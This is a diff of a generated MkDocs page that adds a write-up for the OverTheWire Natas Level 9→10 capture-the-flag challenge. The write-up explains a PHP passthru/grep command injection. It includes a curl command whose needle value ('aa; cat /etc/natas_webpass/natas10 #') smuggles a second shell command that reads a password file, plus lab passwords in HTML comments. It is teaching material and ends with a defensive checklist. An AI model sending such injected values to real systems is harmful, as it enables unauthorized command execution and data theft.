@@ -20,7 +20,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
     
     
       
@@ -37,39 +37,63 @@
   
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
     
+      
+      
     
   
   
@@ -639,6 +663,29 @@
   
   <span class="md-ellipsis">
     UEFI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../foundations/windows/cli-magic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CLI
     
   </span>
   
@@ -2036,6 +2083,57 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Level 9 → Level 10">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level-goal_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Level goal
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-explanation-of-the-vulnerability_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Short explanation of the vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-what-i-ran-and-what-the-server-returned_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step-by-step (what I ran and what the server returned)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessons-learned-concise_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lessons learned (concise)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-defensive-checklist-for-admins_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick defensive checklist for admins
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3224,6 +3322,57 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Level 9 → Level 10">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level-goal_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Level goal
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-explanation-of-the-vulnerability_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Short explanation of the vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-what-i-ran-and-what-the-server-returned_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step-by-step (what I ran and what the server returned)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessons-learned-concise_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lessons learned (concise)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-defensive-checklist-for-admins_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick defensive checklist for admins
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3854,12 +4003,82 @@ hex → bytes → reverse → base64-decode → secret.</p>
 <li>Log and alert on suspicious repeated attempts to reverse-engineer or brute-force secret checks.</li>
 </ul>
 <hr />
-<p>Password discovered: <code>ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t</code> — use it to authenticate as <code>natas9</code> and continue.</p>
 <!--
 ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 -->
 
 <h2 id="level-9-level-10">Level 9 → Level 10</h2>
+<h3 id="level-goal_3">Level goal</h3>
+<p>Read the password for <code>natas10</code> by abusing command injection via a server-side call to <code>grep</code>.<br />
+What you should learn: 
+how unsanitized shell arguments passed to system utilities (passthru/exec)
+lead to command injection and how to exploit it from the CLI.</p>
+<h3 id="short-explanation-of-the-vulnerability_1">Short explanation of the vulnerability</h3>
+<p>The page accepts a <code>needle</code> parameter 
+and then calls PHP's <code>passthru("grep -i $key dictionary.txt")</code>.<br />
+Because the value is interpolated directly into a shell command, 
+special characters let us break out of the grep command and chain arbitrary commands. 
+The web process runs the command and returns its stdout in the page, 
+so we can read files the web user can access.</p>
+<h3 id="step-by-step-what-i-ran-and-what-the-server-returned_2">Step-by-step (what I ran and what the server returned)</h3>
+<p><strong>1) Inspect the page</strong></p>
+<p><div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>natas9:natas9password<span class="w"> </span>http://natas9.natas.labs.overthewire.org/
+</code></pre></div>
+Relevant returned HTML shows a form:
+Output:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas9<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Find words containing: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">needle</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">Search</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><strong>2) Fetch the source to confirm the sink</strong></p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t<span class="w"> </span>http://natas9.natas.labs.overthewire.org/index-source.html
+</code></pre></div>
+<p>Source (extracted and cleaned) shows the relevant PHP:</p>
+<div class="highlight"><pre><span></span><code>&lt;? 
+$key = &quot;&quot;;
+
+if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
+    $key = $_REQUEST[&quot;needle&quot;];
+}
+
+if($key != &quot;&quot;) {
+    passthru(&quot;grep -i $key dictionary.txt&quot;);
+}
+?&gt;
+</code></pre></div>
+<p>Observation: 
+The application directly feeds user input 
+into a shell command with no escaping. 
+That is the injection point.</p>
+<p><strong>3) Exploit command injection to read the next password</strong></p>
+<p>I crafted a needle that closes the grep command 
+and appends a shell command that cats the password file. 
+Example I used:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;needle=aa; cat /etc/natas_webpass/natas10 # &quot;</span><span class="w"> </span>http://natas9.natas.labs.overthewire.org/
+</code></pre></div>
+<p>Server response (relevant part) shows the command output inside the page.
+Whit this I got the password for natas10 and cloud move on to the next level. </p>
+<h3 id="lessons-learned-concise_2">Lessons learned (concise)</h3>
+<ul>
+<li>Never pass raw user input into shell commands. Use escapeshellarg/escapeshellcmd, or better yet avoid shelling out with user data.  </li>
+<li>Command injection lets an attacker run arbitrary commands with the privileges of the web process. It is high severity and trivially exploitable when present.  </li>
+<li>In CTFs and real apps, look for common sinks: <code>system</code>, <code>exec</code>, <code>passthru</code>, <code>shell_exec</code>, backticks, or any code that builds a shell string.</li>
+</ul>
+<h3 id="quick-defensive-checklist-for-admins_2">Quick defensive checklist for admins</h3>
+<ul>
+<li>Do not interpolate user input into shell commands. Use safe APIs or properly escape/validate input.  </li>
+<li>Run the web process with minimal privileges and restrict filesystem access with file permissions.  </li>
+<li>Use application-level allowlists for operations that need external utilities.  </li>
+<li>Monitor logs for unusual shell invocation patterns and unexpected long or chained arguments.</li>
+</ul>
+<!--
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+-->
+
 <h2 id="level-10-level-11">Level 10 → Level 11</h2>
 <h2 id="level-11-level-12">Level 11 → Level 12</h2>
 <h2 id="level-12-level-13">Level 12 → Level 13</h2>
@@ -3964,7 +4183,8 @@ ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
   
 </div>
       
-        <div class="md-social">
+        
+<div class="md-social">
   
     
     
@@ -3993,10 +4213,10 @@ ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
     
     
       
-      <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.top", "navigation.footer", "search.suggest"], "search": "../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.top", "navigation.footer", "search.suggest"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.50899def.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.92b07e13.min.js"></script>
       
     
   </body>
